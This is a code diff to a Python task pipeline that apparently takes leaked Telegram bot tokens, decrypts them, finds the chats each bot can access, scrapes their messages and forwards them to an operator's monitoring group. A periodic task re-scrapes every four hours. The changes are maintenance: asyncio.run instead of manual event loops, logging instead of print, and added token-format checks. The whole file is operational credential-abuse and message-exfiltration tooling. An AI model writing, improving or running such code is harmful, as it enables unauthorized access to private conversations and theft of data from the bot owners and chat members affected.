@@ -29,14 +29,8 @@ def exfiltrate_chat(cred_id: str):
     3. Save to DB.
     4. Trigger broadcast.
     """
-    # Sync wrapper for async logic
-    loop = asyncio.get_event_loop()
-    if loop.is_closed():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    
     try:
-        return loop.run_until_complete(_exfiltrate_logic(cred_id))
+        return asyncio.run(_exfiltrate_logic(cred_id))
     except SoftTimeLimitExceeded:
         logger.warning(f"⏰ [Exfil] Soft time limit exceeded for {cred_id}. Saving partial results.")
         return f"Exfiltration timed out for {cred_id} (partial results may have been saved)."
@@ -81,6 +75,13 @@ async def _exfiltrate_logic(cred_id: str):
         await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
         return f"Decryption failed for {cred_id}: {e}"
 
+    # Validate decrypted token format before use
+    from app.utils.helpers import is_valid_telegram_token
+    if not is_valid_telegram_token(bot_token):
+        logger.error(f"❌ [Exfil] Decrypted token has invalid format for {cred_id}. Marking revoked.")
+        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
+        return f"Invalid token format after decryption for {cred_id}"
+
     # Scrape
     try:
         logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
@@ -92,6 +93,7 @@ async def _exfiltrate_logic(cred_id: str):
         await broadcaster.send_log(f"✅ Scraped {len(messages)} messages.")
     except SoftTimeLimitExceeded:
         logger.warning(f"⏰ [Exfil] Scraping timed out for chat {chat_id}. Continuing with 0 messages.")
+        # Don't mark revoked — timeout is transient. Leave status as-is for retry.
         messages = []
     except Exception as e:
         logger.error(f"❌ [Exfil] Scraper failed: {e}")
@@ -139,11 +141,7 @@ def enrich_credential(cred_id: str):
     3. Update DB with Chat ID(s).
     4. Trigger Exfiltration.
     """
-    loop = asyncio.get_event_loop()
-    if loop.is_closed():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    return loop.run_until_complete(_enrich_logic(cred_id))
+    return asyncio.run(_enrich_logic(cred_id))
 
 async def _enrich_logic(cred_id: str):
     logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
@@ -179,6 +177,13 @@ async def _enrich_logic(cred_id: str):
         await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
         return f"Decryption failed: {e}"
 
+    # Validate decrypted token format before use
+    from app.utils.helpers import is_valid_telegram_token
+    if not is_valid_telegram_token(bot_token):
+        logger.error(f"❌ [Enrich] Decrypted token has invalid format for {cred_id}. Marking revoked.")
+        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
+        return f"Invalid token format after decryption for {cred_id}"
+
     # Discover
     bot_info = {}
     try:
@@ -210,7 +215,7 @@ async def _enrich_logic(cred_id: str):
     # 2. If more chats, create NEW records (clones).
     
     first_chat = chats[0]
-    print(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
+    logger.info(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
     
     # Update primary
     # Pre-create Topic with NEW FORMAT: @username / botid
@@ -225,7 +230,7 @@ async def _enrich_logic(cred_id: str):
         topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
         # Header handled by ensure_topic automatically
     except Exception as e:
-        print(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")
+        logger.warning(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")
 
     meta_payload = {
         "chat_name": first_chat["name"], 
@@ -243,7 +248,7 @@ async def _enrich_logic(cred_id: str):
     }).eq("id", cred_id))
     
     # Trigger Exfiltration for Primary
-    print(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
+    logger.info(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
     await broadcaster.send_log(f"🚀 Triggering background exfiltration task.")
     exfiltrate_chat.delay(cred_id)
     
@@ -288,11 +293,7 @@ def broadcast_pending():
         return "System Paused"
 
     try:
-        loop = asyncio.get_event_loop()
-        if loop.is_closed():
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-        return loop.run_until_complete(_broadcast_logic())
+        return asyncio.run(_broadcast_logic())
     finally:
         try:
             lock.release()
@@ -431,7 +432,7 @@ async def _broadcast_logic():
                 # Update DB
                 meta["topic_id"] = thread_id
                 await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
-                print(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
+                logger.info(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
             
             # Update local cache
             cached_topic_ids[cred_id] = thread_id
@@ -485,7 +486,7 @@ async def _broadcast_logic():
             await asyncio.sleep(2.0) 
 
         except Exception as e:
-            print(f"Error broadcasting msg {msg_id}: {e}")
+            logger.error(f"Error broadcasting msg {msg_id}: {e}")
             # Clear claim on error so message can be retried
             try:
                 await async_execute(db.table("exfiltrated_messages").update({
@@ -507,22 +508,17 @@ def system_heartbeat():
     """
     Periodic ping to confirm system uptime.
     """
-    loop = asyncio.get_event_loop()
-    if loop.is_closed():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    
     msg = "💓 **System Heartbeat**: Worker is active and scanning."
     
     # Update Redis Timestamp for Watchdog
     try:
         redis_client.set("system:heartbeat:last_seen", int(time.time()))
     except Exception as e:
-        print(f"Failed to update heartbeat in Redis: {e}")
+        logger.warning(f"Failed to update heartbeat in Redis: {e}")
 
     from app.services.broadcaster_srv import BroadcasterService
     broadcaster = BroadcasterService()
-    loop.run_until_complete(broadcaster.send_log(msg))
+    asyncio.run(broadcaster.send_log(msg))
     return "Heartbeat sent."
 
 @app.task(name="flow.system_help")
@@ -530,11 +526,6 @@ def system_help():
     """
     Periodic guide on how to use system commands.
     """
-    loop = asyncio.get_event_loop()
-    if loop.is_closed():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    
     msg = (
         "ℹ️ **System Commands Guide**\n"
         "You can control the system using these commands:\n\n"
@@ -546,7 +537,7 @@ def system_help():
     )
     from app.services.broadcaster_srv import BroadcasterService
     broadcaster = BroadcasterService()
-    loop.run_until_complete(broadcaster.send_log(msg))
+    asyncio.run(broadcaster.send_log(msg))
     return "Help guide sent."
 
 @app.task(name="flow.rescrape_active")
@@ -555,11 +546,7 @@ def rescrape_active():
     Periodic task to re-scrape all active credentials for new messages.
     Runs every 4 hours to catch new activity in monitored chats.
     """
-    loop = asyncio.get_event_loop()
-    if loop.is_closed():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    return loop.run_until_complete(_rescrape_active_logic())
+    return asyncio.run(_rescrape_active_logic())
 
 async def _rescrape_active_logic():
     """
@@ -593,7 +580,7 @@ async def _rescrape_active_logic():
                 exfiltrate_chat.delay(cred_id)
                 queued += 1
             except Exception as e:
-                print(f"Failed to queue exfiltration for {cred_id}: {e}")
+                logger.error(f"Failed to queue exfiltration for {cred_id}: {e}")
         
         msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials for exfiltration."
         await broadcaster.send_log(msg)
